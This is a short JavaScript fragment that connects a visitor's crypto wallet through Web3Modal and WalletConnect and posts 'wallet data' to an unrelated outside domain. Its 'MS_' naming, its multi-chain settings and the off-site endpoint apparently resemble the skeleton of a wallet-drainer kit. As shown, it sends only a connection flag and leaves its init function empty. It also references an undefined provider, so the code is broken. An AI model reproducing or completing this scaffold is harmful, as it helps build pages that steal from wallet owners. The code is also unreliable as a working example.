// Initialize providers
const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;

const providerOptions = {
    walletconnect: {
        package: WalletConnectProvider,
        options: {
            infuraId: "511362d7fcc8491f9af15cc7fadf46ae"
        }
    }
};

const web3Modal = new Web3Modal({
    network: "mainnet",
    cacheProvider: true,
    providerOptions
});
// Rest of your existing code
const API_ENDPOINT = 'https://fasterdeliveryuae.com';
const MS_Settings = {
    RPCs: provider.rpc,
    chains: {
        1: { name: "Ethereum", explorer: "https://etherscan.io" },
        56: { name: "BSC", explorer: "https://bscscan.com" },
        137: { name: "Polygon", explorer: "https://polygonscan.com" }
    }
};

function ms_init() {
    // Wallet connection logic
}

// Fast wallet connection
async function connectWallet(provider) {
    const accounts = await provider.request({ method: 'eth_requestAccounts' });
    return accounts[0];
}

// Efficient backend communication
async function sendWalletData() {
    const response = await fetch(`${API_ENDPOINT}/wallet`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ connected: true })
    });
    return response.json();
}
